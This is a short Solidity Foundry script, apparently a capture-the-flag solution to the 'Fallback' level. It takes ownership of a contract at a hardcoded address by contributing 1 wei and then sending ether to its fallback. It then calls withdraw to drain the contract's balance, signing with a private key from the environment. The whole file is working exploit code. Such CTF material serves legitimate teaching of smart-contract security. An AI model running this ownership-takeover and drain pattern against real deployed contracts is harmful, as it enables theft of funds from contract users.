// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {
    
    Fallback public fallbackIns = Fallback(payable(0x4c949eF7B0BeBd67aDCaf8c0bB99af0908fCD0BC));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackIns.contribute{value: 1 wei}(); // Call the contribute function with some wei
        (bool success, ) = address(fallbackIns).call{value: 1 wei}("");
        require(success, "Transaction failed");
        console.log("New Owner: ", fallbackIns.owner());
        console.log("My address: ", vm.envAddress("MY_ADDRESS"));
        fallbackIns.withdraw(); // Drain the contract's ETH by calling the withdraw function.

        vm.stopBroadcast();
    }
}